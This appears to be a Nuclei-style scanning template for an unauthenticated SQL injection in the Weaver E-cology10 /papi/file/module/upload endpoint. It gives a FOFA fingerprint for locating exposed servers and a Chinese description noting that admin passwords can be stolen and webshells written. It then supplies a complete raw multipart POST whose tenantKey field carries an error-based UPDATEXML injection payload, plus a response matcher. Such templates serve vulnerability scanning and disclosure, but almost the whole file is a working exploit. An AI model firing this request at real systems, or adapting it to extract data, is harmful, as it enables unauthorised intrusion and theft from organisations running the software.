id: FanWei-E-cology10-papi-file-module-upload-SQL

info:
  name: 泛微E-cology10 /papi/file/module/upload SQL注入
  author: HuanXiong
  severity: high
  description: |-
    fofa: icon_hash="-1619753057"
    泛微E-cology10 /papi/file/module/upload 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - 
  tags: sql, weaver, ecology

http:
  - raw:
      - |-
        POST /papi/file/module/upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaWHGymScKhqbXm7z
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
        
        ------WebKitFormBoundaryaWHGymScKhqbXm7z
        Content-Disposition: form-data; name="module"
        
        sp
        ------WebKitFormBoundaryaWHGymScKhqbXm7z
        Content-Disposition: form-data; name="tenantKey"
        
        ' AND UPDATEXML(1,concat('~',md5(123456),'~'),1)#
        ------WebKitFormBoundaryaWHGymScKhqbXm7z
        Content-Disposition: form-data; name="file"; filename="123.txt"
        Content-Type: text/plain
        
        123321
        ------WebKitFormBoundaryaWHGymScKhqbXm7z--

    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - "status_code == 200 && contains_all(body, '~e10adc3949ba59abbe56e057f20f883')"